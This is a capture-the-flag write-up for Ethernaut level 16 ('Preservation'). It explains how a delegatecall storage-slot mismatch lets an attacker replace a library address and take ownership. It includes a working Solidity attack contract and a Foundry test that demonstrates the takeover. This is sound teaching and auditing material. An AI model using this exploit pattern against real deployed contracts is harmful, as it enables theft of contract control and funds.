# Level 16 - Preservation

## Objectives

- Become the owner of the `Preservation` contract.

## Contract Overview

The `Preservation` contract has two functions to set the time in the time zone libraries. It uses `delegatecall` to do so.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Preservation_slither.png)

## Finding the weak spots

The `delegatecall` is a mechanism that allows contract A to execute code from contract B while preserving the state of contract A. This means that any state changes made by contract B during the `delegatecall` will actually affect the state of contract A. Therefore, it is crucial to ensure that both contracts have the same state variables declared in the same order.

However, in the `Preser`vation`contract, there are 5 state variables declared while the`LibraryContract `has only 1. Furthermore, the order of state variable declaration in the `Preservation`contract is different from that in the`LibraryContract`. This means that the `Preservation`contract is not compatible with the`LibraryContract`for the`delegatecall`mechanism, and attempting to delegate a call from the`Preservation`contract to the`LibraryContract` can result in unexpected behavior or errors.

```solidity
contract Preservation {
 address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint256 storedTime; // slot 3
}

contract LibraryContract {
 uint256 storedTime; // slot 0
}
```

When making a delegatecall from the Preservation contract to the LibraryContract, the code from the LibraryContract will be executed using the context of the Preservation contract. This means that any state variables declared in the Preservation contract will be preserved, but their values may be modified by the code executed from the LibraryContract.

In the case of the delegatecall to the LibraryContract's setTime function, the storedTime state variable in the LibraryContract will be modified, but it will be stored in the same memory slot as the first state variable of the Preservation contract (i.e., timeZone1Library at slot 0). It means that the `timeZone1Library` address variable at slot `0` will be modified.

In other words if LibraryContract modify the state, it will not modify its own state but the caller (`Preservation`) one! This mean that when `LibraryContract.setTime` update the `storedTime` state variable is not updating the variable from its own contract but the one in slot0 of the caller contract that is the `timeZone1Library` address.

However, it's important to note that this will not allow us to directly modify the owner variable in the Preservation contract, as it is not related to the LibraryContract or the storedTime value. We would need to find another vulnerability or attack vector to modify the owner variable.

## Potential attack scenario (hypothesis)

Attacker can create a malicious `PreservationAttack` contract that will call the `setFirstTime` function on the `Preservation` contract. In this function call, he will pass the address of his `PreservationAttack` contract as a parameter to the `delegatecall`. This will modify the address `timeZone1LibraryAddress` variable, which is at slot 0 of the `Preservation` contract, to be equal to the address of his `PreservationAttack` contract.

After successfully modifying the `timeZone1Library` variable, attacker can make a second call that will execute the `delegatecall` on his malicious `PreservationAttack` contract. In this call, he can include code that modifies the owner variable of the `Preservation` contract to become his own address. Because the `delegatecall` executes the code of the `PreservationAttack` contract in the context of the `Preservation` contract, it will have access to and be able to modify the state variables of the `Preservation` contract.

By performing these two steps, attacker can effectively take control of the `Preservation` contract and become its owner.

In other words first, attacker calls `setFirstTime` on the `Preservation` contract to overwrite the library address with his malicious `PreservationAttack` contract. Using a second call to `setFirstTime`, the `Preservation` contract invokes the `setTime` function of malicious `PreservationAttack` contract which has the exact same storage layout as the `Preservation` contract. In attacker malicious `setTime` function in `PreservationAttack` contract, attacker simply overwrite the third storage slot (`owner`).

## Plan of the attack

1. Attacker creates the `PreservationAttack` contract.
2. Attacker calls the `attack` function on the `PreservationAttack` contract.
3. Function `attack` makes two calls to the `Preservation` contract.
4. The first call executes a function `setFirstTime` with an address of `PreservationAttack` casted to `uint256`.
5. Because the first call modified the address of `timeZone1LibraryAddress`, the second call will execute a malicious `setFirstTime` function on the `PreservationAttack` contract.
6. The malicious `setTime` function changes the state variable `owner` to be the address of attacker.

## Malicious contract (PreservationAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    Preservation preservationContract;

    constructor(address _preservationContract) {
        preservationContract = Preservation(_preservationContract);
    }

    // 6. The malicious `setTime` function changes the state variable `owner` to be the address of attacker.
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

    // 3. Function `attack` makes two calls to the `Preservation` contract.
    function attack() external {
        // 4. The first call executes a function `setFirstTime` with an address of `PreservationAttack` casted to `uint256`.
        preservationContract.setFirstTime(uint256(uint160(address(this))));
        // 5. Because the first call modified the address of `timeZone1LibraryAddress`, the second call will execute a malicious `setFirstTime` function on the `PreservationAttack` contract.
        preservationContract.setFirstTime(
            uint256(uint160(address(msg.sender)))
        );
    }
}

```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/16-Preservation.t.sol))

```solidity
        // 1. Attacker creates the `PreservationAttack` contract.
        PreservationAttack preservationAttack = new PreservationAttack(
            address(preservationContract)
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_address("Address of attacker: ", attacker);
        emit log_named_address(
            "Address of the contract owner before attack: ",
            preservationContract.owner()
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("Starting the exploit...");
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // 2. Attacker calls the `attack` function on the `PreservationAttack` contract.
        preservationAttack.attack();

        emit log_named_address(
            "Address of the contract owner after attack: ",
            preservationContract.owner()
        );

        // Test assertion
        assertEq(preservationContract.owner(), attacker);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Preservation.png)

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-16-solution-preservation)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
